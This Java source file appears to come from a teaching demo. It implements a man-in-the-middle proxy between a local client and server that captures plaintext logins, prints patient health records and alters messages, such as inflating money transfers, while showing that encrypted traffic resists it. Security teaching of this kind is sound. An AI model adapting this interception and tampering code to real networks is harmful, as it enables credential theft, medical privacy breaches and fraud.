package com.mitm.attacker;

import com.mitm.models.HealthRecord;
import com.mitm.models.Message;
import com.mitm.models.User;
import com.mitm.utils.Logger;
import com.mitm.utils.MessageEncryptor;
import com.mitm.utils.NetworkUtils;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

/**
 * MITM Attacker/Proxy component
 * Sits between client and server, intercepting all traffic
 * Demonstrates various attack scenarios:
 * - Passive eavesdropping
 * - Credential theft
 * - Message modification
 * - Data injection
 */
public class MITMProxy {
    private static final int PROXY_PORT = 8081;  // Port where attacker listens for clients
    private static final String SERVER_HOST = "localhost";
    private static final int SERVER_PORT = 8080;  // Real server port

    private ServerSocket proxySocket;
    private boolean running;
    private AttackMode attackMode;
    private List<Message> interceptedMessages;
    private List<User> stolenCredentials;
    private List<HealthRecord> stolenHealthRecords;
    private ConcurrentHashMap<String, InterceptionStats> stats;

    public enum AttackMode {
        PASSIVE,           // Just log, don't modify
        CREDENTIAL_THEFT,  // Steal login credentials
        MESSAGE_MODIFY,    // Modify message content
        DATA_INJECTION,    // Inject additional data
        FULL_ATTACK        // All attack types
    }

    public static class InterceptionStats {
        public int messagesIntercepted = 0;
        public int credentialsStolen = 0;
        public int healthRecordsStolen = 0;
        public int messagesModified = 0;
        public long startTime = System.currentTimeMillis();
    }

    public MITMProxy() {
        this.attackMode = AttackMode.FULL_ATTACK;
        this.interceptedMessages = new ArrayList<>();
        this.stolenCredentials = new ArrayList<>();
        this.stolenHealthRecords = new ArrayList<>();
        this.stats = new ConcurrentHashMap<>();
        this.stats.put("global", new InterceptionStats());
    }

    /**
     * Start the MITM proxy
     */
    public void start() {
        try {
            proxySocket = new ServerSocket(PROXY_PORT);
            running = true;
            
            Logger.logAttackerActivity("MITM Proxy started on port " + PROXY_PORT);
            Logger.logAttackerActivity("Forwarding to real server at " + SERVER_HOST + ":" + SERVER_PORT);
            Logger.logAttackerActivity("Attack mode: " + attackMode);
            
            System.out.println("=".repeat(60));
            System.out.println("⚠️  MITM ATTACKER PROXY STARTED ⚠️");
            System.out.println("=".repeat(60));
            System.out.println("Listening on port: " + PROXY_PORT);
            System.out.println("Forwarding to: " + SERVER_HOST + ":" + SERVER_PORT);
            System.out.println("Attack mode: " + attackMode);
            System.out.println("=".repeat(60));

            // Accept client connections
            while (running) {
                try {
                    Socket clientSocket = proxySocket.accept();
                    Logger.logAttackerActivity("Client connected to MITM proxy from " + 
                        clientSocket.getInetAddress().getHostAddress());
                    
                    // Handle each client in a separate thread
                    new Thread(() -> handleClientConnection(clientSocket)).start();
                } catch (IOException e) {
                    if (running) {
                        Logger.log(Logger.LogLevel.ERROR, "ATTACKER", 
                            "Error accepting client: " + e.getMessage());
                    }
                }
            }
        } catch (IOException e) {
            Logger.log(Logger.LogLevel.ERROR, "ATTACKER", 
                "Failed to start MITM proxy: " + e.getMessage());
        }
    }

    /**
     * Handle client connection - intercept and forward traffic
     */
    private void handleClientConnection(Socket clientSocket) {
        Socket serverSocket = null;
        String clientId = clientSocket.getInetAddress().getHostAddress() + ":" + 
                         clientSocket.getPort();

        try {
            // Connect to real server
            serverSocket = new Socket(SERVER_HOST, SERVER_PORT);
            Logger.logAttackerActivity("Connected to real server for client: " + clientId);

            // Create two threads: one for client->server, one for server->client
            final Socket finalServerSocket = serverSocket;
            
            // Thread 1: Intercept client -> server traffic
            Thread clientToServer = new Thread(() -> 
                interceptClientToServer(clientSocket, finalServerSocket, clientId));
            
            // Thread 2: Intercept server -> client traffic
            Thread serverToClient = new Thread(() -> 
                interceptServerToClient(finalServerSocket, clientSocket, clientId));

            clientToServer.start();
            serverToClient.start();

            // Wait for both threads to complete
            clientToServer.join();
            serverToClient.join();

        } catch (Exception e) {
            Logger.log(Logger.LogLevel.ERROR, "ATTACKER", 
                "Error handling client connection: " + e.getMessage());
        } finally {
            NetworkUtils.closeSocket(clientSocket);
            NetworkUtils.closeSocket(serverSocket);
            Logger.logAttackerActivity("Client connection closed: " + clientId);
        }
    }

    /**
     * Intercept traffic from client to server
     */
    private void interceptClientToServer(Socket clientSocket, Socket serverSocket, String clientId) {
        try {
            while (!clientSocket.isClosed() && !serverSocket.isClosed()) {
                Message message = NetworkUtils.receiveMessage(clientSocket);
                
                if (message == null) {
                    break;
                }

                // Update stats
                stats.get("global").messagesIntercepted++;

                Logger.logAttackerActivity("⚠️ INTERCEPTED message from CLIENT to SERVER");
                Logger.logAttackerActivity("  Type: " + message.getType());
                Logger.logAttackerActivity("  Encrypted: " + message.isEncrypted());

                // Store original message
                Message originalMessage = message.copy();
                interceptedMessages.add(originalMessage);

                // Perform attack based on mode
                Message modifiedMessage = performAttack(message, clientId);

                // Mark as intercepted
                modifiedMessage.setIntercepted(true);

                // Forward to server (original or modified)
                NetworkUtils.sendMessage(serverSocket, modifiedMessage);
                Logger.logAttackerActivity("  Forwarded to server");
            }
        } catch (IOException e) {
            Logger.log(Logger.LogLevel.WARNING, "ATTACKER", 
                "Client-to-server interception ended: " + e.getMessage());
        }
    }

    /**
     * Intercept traffic from server to client
     */
    private void interceptServerToClient(Socket serverSocket, Socket clientSocket, String clientId) {
        try {
            while (!serverSocket.isClosed() && !clientSocket.isClosed()) {
                Message message = NetworkUtils.receiveMessage(serverSocket);
                
                if (message == null) {
                    break;
                }

                Logger.logAttackerActivity("⚠️ INTERCEPTED response from SERVER to CLIENT");
                Logger.logAttackerActivity("  Type: " + message.getType());

                // Store intercepted response
                interceptedMessages.add(message.copy());

                // Could modify server responses too
                if (attackMode == AttackMode.MESSAGE_MODIFY || attackMode == AttackMode.FULL_ATTACK) {
                    // Example: modify server responses
                    if (message.getType() == Message.MessageType.RESPONSE && 
                        !message.isEncrypted()) {
                        String content = message.getContent();
                        if (content.startsWith("Processed:")) {
                            message.setContent(content + " [MODIFIED BY ATTACKER]");
                            message.setModified(true);
                            stats.get("global").messagesModified++;
                            Logger.logAttackerActivity("  ⚠️ MODIFIED server response!");
                        }
                    }
                }

                // Forward to client
                NetworkUtils.sendMessage(clientSocket, message);
                Logger.logAttackerActivity("  Forwarded to client");
            }
        } catch (IOException e) {
            Logger.log(Logger.LogLevel.WARNING, "ATTACKER", 
                "Server-to-client interception ended: " + e.getMessage());
        }
    }

    /**
     * Perform attack on intercepted message
     */
    private Message performAttack(Message message, String clientId) {
        Message modified = message.copy();

        switch (attackMode) {
            case PASSIVE:
                // Just log, don't modify
                Logger.logInterception(message, null, "Passive eavesdropping");
                break;

            case CREDENTIAL_THEFT:
            case FULL_ATTACK:
                if (message.getType() == Message.MessageType.LOGIN) {
                    stealCredentials(message);
                }
                break;
        }

        // Intercept health data (only for unencrypted messages)
        if ((attackMode == AttackMode.CREDENTIAL_THEFT || attackMode == AttackMode.FULL_ATTACK)
            && !message.isEncrypted() && message.getType() == Message.MessageType.DATA) {
            
            String content = message.getContent();
            if (content.contains("PATIENT_NAME:") && content.contains("BLOOD_TYPE:")) {
                stealHealthData(message);
            }
        }

        // Message modification (only for unencrypted messages)
        if ((attackMode == AttackMode.MESSAGE_MODIFY || attackMode == AttackMode.FULL_ATTACK)
            && !message.isEncrypted()) {
            
            if (message.getType() == Message.MessageType.DATA) {
                String originalContent = message.getContent();
                String modifiedContent = modifyMessageContent(originalContent);
                
                if (!originalContent.equals(modifiedContent)) {
                    modified.setContent(modifiedContent);
                    modified.setModified(true);
                    stats.get("global").messagesModified++;
                    
                    Logger.logInterception(message, modified, "Message content modified");
                    System.out.println("⚠️ MESSAGE MODIFIED: " + originalContent +
                        " -> " + modifiedContent);
                }
            }
        }

        return modified;
    }

    /**
     * Steal login credentials
     */
    private void stealCredentials(Message loginMessage) {
        try {
            String content = loginMessage.getContent();
            
            // If encrypted, we can't read it (demonstrates encryption protection)
            if (loginMessage.isEncrypted()) {
                Logger.logAttackerActivity("  ⚠️ Login is ENCRYPTED - Cannot steal credentials!");
                Logger.logAttackerActivity("  Encrypted content: " + content);
                System.out.println("⚠️ ENCRYPTED LOGIN - Attacker cannot read credentials!");
                return;
            }

            // Parse unencrypted credentials
            String[] credentials = content.split(":");
            if (credentials.length == 2) {
                String username = credentials[0];
                String password = credentials[1];

                User stolenUser = new User(username, password);
                stolenCredentials.add(stolenUser);
                stats.get("global").credentialsStolen++;

                Logger.logCredentialTheft(stolenUser);
                
                System.out.println("=".repeat(60));
                System.out.println("⚠️⚠️⚠️ CREDENTIALS STOLEN! ⚠️⚠️⚠️");
                System.out.println("Username: " + username);
                System.out.println("Password: " + password);
                System.out.println("=".repeat(60));
            }
        } catch (Exception e) {
            Logger.log(Logger.LogLevel.ERROR, "ATTACKER", 
                "Error stealing credentials: " + e.getMessage());
        }
    }

    /**
     * Steal health data from intercepted message
     */
    private void stealHealthData(Message message) {
        try {
            String content = message.getContent();
            
            // If encrypted, we can't read it (demonstrates encryption protection)
            if (message.isEncrypted()) {
                Logger.logAttackerActivity("  ⚠️ Health data is ENCRYPTED - Cannot steal!");
                System.out.println("⚠️ ENCRYPTED HEALTH DATA - Attacker cannot read!");
                return;
            }

            // Parse unencrypted health data
            HealthRecord record = HealthRecord.fromDataString(content);
            stolenHealthRecords.add(record);
            stats.get("global").healthRecordsStolen++;

            Logger.logAttackerActivity("⚠️⚠️⚠️ HEALTH DATA STOLEN! ⚠️⚠️⚠️");
            Logger.logAttackerActivity("Patient: " + record.getPatientName());
            Logger.logAttackerActivity("Age: " + record.getAge());
            Logger.logAttackerActivity("Blood Type: " + record.getBloodType());
            Logger.logAttackerActivity("Medical Condition: " + record.getMedicalCondition());
            Logger.logAttackerActivity("Medications: " + record.getMedications());
            Logger.logAttackerActivity("Allergies: " + record.getAllergies());
            Logger.logAttackerActivity("Symptoms: " + record.getSymptoms());
            
            System.out.println("\n" + "=".repeat(70));
            System.out.println("🚨🚨🚨 SENSITIVE HEALTH DATA INTERCEPTED! 🚨🚨🚨");
            System.out.println("=".repeat(70));
            System.out.println("Patient Name: " + record.getPatientName());
            System.out.println("Age: " + record.getAge() + " years old");
            System.out.println("Blood Type: " + record.getBloodType());
            System.out.println("Medical Condition: " + record.getMedicalCondition());
            System.out.println("Current Medications: " + record.getMedications());
            System.out.println("Allergies: " + record.getAllergies());
            System.out.println("Current Symptoms: " + record.getSymptoms());
            System.out.println("=".repeat(70));
            System.out.println("⚠️ This demonstrates how unencrypted health data can be stolen!");
            System.out.println("=".repeat(70) + "\n");
            
        } catch (Exception e) {
            Logger.log(Logger.LogLevel.ERROR, "ATTACKER",
                "Error stealing health data: " + e.getMessage());
        }
    }

    /**
     * Modify message content (example attack)
     */
    private String modifyMessageContent(String original) {
        // Don't modify health data - just intercept it
        if (original.contains("PATIENT_NAME:") && original.contains("BLOOD_TYPE:")) {
            return original;
        }
        
        // Example modifications for other data
        if (original.toLowerCase().contains("transfer")) {
            // Modify financial transactions
            return original.replace("$100", "$1000").replace("$50", "$500");
        } else if (original.toLowerCase().contains("delete")) {
            // Change delete to keep
            return original.replace("delete", "keep");
        } else {
            // Add attacker signature
            return original + " [INTERCEPTED]";
        }
    }

    /**
     * Set attack mode
     */
    public void setAttackMode(AttackMode mode) {
        this.attackMode = mode;
        Logger.logAttackerActivity("Attack mode changed to: " + mode);
    }

    /**
     * Get intercepted messages
     */
    public List<Message> getInterceptedMessages() {
        return new ArrayList<>(interceptedMessages);
    }

    /**
     * Get stolen credentials
     */
    public List<User> getStolenCredentials() {
        return new ArrayList<>(stolenCredentials);
    }

    /**
     * Get stolen health records
     */
    public List<HealthRecord> getStolenHealthRecords() {
        return new ArrayList<>(stolenHealthRecords);
    }

    /**
     * Get statistics
     */
    public InterceptionStats getStats() {
        return stats.get("global");
    }

    /**
     * Stop the proxy
     */
    public void stop() {
        running = false;
        try {
            if (proxySocket != null && !proxySocket.isClosed()) {
                proxySocket.close();
            }
            Logger.logAttackerActivity("MITM Proxy stopped");
            printFinalStats();
        } catch (IOException e) {
            Logger.log(Logger.LogLevel.ERROR, "ATTACKER", 
                "Error stopping proxy: " + e.getMessage());
        }
    }

    /**
     * Print final statistics
     */
    private void printFinalStats() {
        InterceptionStats globalStats = stats.get("global");
        long duration = (System.currentTimeMillis() - globalStats.startTime) / 1000;

        System.out.println("\n" + "=".repeat(60));
        System.out.println("MITM ATTACK STATISTICS");
        System.out.println("=".repeat(60));
        System.out.println("Duration: " + duration + " seconds");
        System.out.println("Messages intercepted: " + globalStats.messagesIntercepted);
        System.out.println("Credentials stolen: " + globalStats.credentialsStolen);
        System.out.println("Health records stolen: " + globalStats.healthRecordsStolen);
        System.out.println("Messages modified: " + globalStats.messagesModified);
        System.out.println("=".repeat(60));
        
        if (globalStats.healthRecordsStolen > 0) {
            System.out.println("\n⚠️ STOLEN HEALTH RECORDS SUMMARY:");
            System.out.println("=".repeat(60));
            for (int i = 0; i < stolenHealthRecords.size(); i++) {
                HealthRecord record = stolenHealthRecords.get(i);
                System.out.println("\nRecord #" + (i + 1) + ":");
                System.out.println("  Patient: " + record.getPatientName());
                System.out.println("  Age: " + record.getAge());
                System.out.println("  Blood Type: " + record.getBloodType());
                System.out.println("  Condition: " + record.getMedicalCondition());
                System.out.println("  Medications: " + record.getMedications());
            }
            System.out.println("=".repeat(60));
        }
    }

    /**
     * Main method to run attacker standalone
     */
    public static void main(String[] args) {
        MITMProxy proxy = new MITMProxy();
        
        // Add shutdown hook
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println("\nShutting down MITM proxy...");
            proxy.stop();
        }));
        
        proxy.start();
    }
}
